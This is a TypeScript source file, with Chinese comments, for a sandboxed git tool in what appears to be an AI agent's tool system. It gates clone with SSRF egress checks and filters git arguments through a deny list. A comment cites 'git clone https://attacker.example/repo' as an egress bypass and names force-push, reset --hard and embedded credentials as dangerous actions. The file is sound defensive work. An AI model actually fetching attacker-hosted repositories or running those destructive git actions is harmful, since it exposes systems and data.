/**
 * T3-10 · `git` 工具（clone / status / diff / commit / branch，**只在沙箱内**）。
 *
 * 五条动作与各自的闸
 * ---------------
 * | action | 额外校验 | 说明 |
 * |---|---|---|
 * | `clone` | `checkGitCommand` + **`checkEgress(url)`** | clone 是**出网**动作，必须过 SSRF |
 * | `status` / `diff` / `commit` / `branch` | `checkGitCommand` | 纯本地 |
 *
 * 为什么 `checkGitCommand` 扫的是 `args` 而不是拼好的整条命令
 * -----------------------------------------------------
 *   `git` 的危险动作（强推 / reset --hard / 内嵌凭证 / filter-branch）都在**子命令与参数**
 *   里，与"git 这个可执行文件"无关。拼上 `"git"` 再扫会让模式里必须容忍前缀，反而模糊。
 *   py `check_git_command(args)` 就是这个口径。
 *
 * 为什么 clone 也要过 `checkEgress`
 * ------------------------------
 *   `git clone https://attacker.example/repo` 会**从外网取内容并落盘**，等价于一次任意
 *   出网。如果只做命令黑名单，`git clone` 就成了绕过 SSRF 的后门（`check_command` 挡不住
 *   任意域名）。所以 clone 的 URL 必须走与 `http` 工具同一套出网校验。
 */

import { checkEgress, EgressDeniedError } from "../guards/ssrf.js";
import { CommandDeniedError, checkGitCommand } from "../guards/command.js";
import type { BuiltinTool, ToolContext, ToolOutcome } from "../registry.js";

/** 五个合法动作。 */
export const GIT_ACTIONS = ["clone", "status", "diff", "commit", "branch"] as const;
export type GitAction = (typeof GIT_ACTIONS)[number];

export const gitTool: BuiltinTool = {
  name: "git",
  requiresSandbox: true,

  async execute(args: Readonly<Record<string, unknown>>, context: ToolContext): Promise<ToolOutcome> {
    const startedAt = Date.now();
    const action = String(args.action ?? "");

    if (!(GIT_ACTIONS as readonly string[]).includes(action)) {
      return {
        ok: false,
        error: `未知 action ${JSON.stringify(args.action)}（允许：${GIT_ACTIONS.join(" / ")}）`,
        errorCode: "VALIDATION_ERROR",
        durationMs: Date.now() - startedAt,
      };
    }

    const extra = Array.isArray(args.args) ? args.args.map(String) : [];

    // 闸 1：git 子命令黑名单
    try {
      checkGitCommand([action, ...extra]);
    } catch (error) {
      if (error instanceof CommandDeniedError) {
        return {
          ok: false,
          error: error.message,
          errorCode: "PERMISSION_DENIED",
          durationMs: Date.now() - startedAt,
        };
      }
      throw error;
    }

    // 闸 2（仅 clone）：出网校验
    if (action === "clone") {
      const url = extra[0];
      if (url === undefined || url === "") {
        return {
          ok: false,
          error: "clone 需要给出仓库 URL（args[0]）",
          errorCode: "VALIDATION_ERROR",
          durationMs: Date.now() - startedAt,
        };
      }
      try {
        await checkEgress(url, {
          ...(context.egressAllowlist === undefined ? {} : { allowlist: context.egressAllowlist }),
          ...(context.resolver === undefined ? {} : { resolver: context.resolver }),
        });
      } catch (error) {
        if (error instanceof EgressDeniedError) {
          return {
            ok: false,
            error: `clone 出网被拒：${error.message}`,
            errorCode: "PERMISSION_DENIED",
            durationMs: Date.now() - startedAt,
          };
        }
        throw error;
      }
    }

    // 闸 3：沙箱
    if (context.sandbox === undefined || context.session === undefined) {
      return {
        ok: false,
        error: "git 需要沙箱会话（未注入则拒绝执行）",
        errorCode: "INTERNAL_ERROR",
        durationMs: Date.now() - startedAt,
      };
    }

    // 闸 4：唯一执行出口
    const result = await context.sandbox.exec(context.session, ["git", action, ...extra], {
      cwd: context.session.workdir,
      ...(typeof args.timeout_ms === "number" ? { timeoutMs: args.timeout_ms } : {}),
    });

    if (result.timedOut) {
      return {
        ok: false,
        error: "git 执行超时",
        errorCode: "TOOL_TIMEOUT",
        durationMs: result.durationMs,
        sandboxSessionId: context.session.id,
        timedOut: true,
      };
    }
    if (result.exitCode !== 0) {
      return {
        ok: false,
        error: result.stderr === "" ? `git 退出码 ${String(result.exitCode)}` : result.stderr,
        errorCode: "INTERNAL_ERROR",
        exitCode: result.exitCode ?? undefined,
        durationMs: result.durationMs,
        sandboxSessionId: context.session.id,
      };
    }

    return {
      ok: true,
      output: { action, stdout: result.stdout, stderr: result.stderr, truncated: result.truncated },
      exitCode: result.exitCode ?? 0,
      durationMs: result.durationMs,
      sandboxSessionId: context.session.id,
    };
  },
};
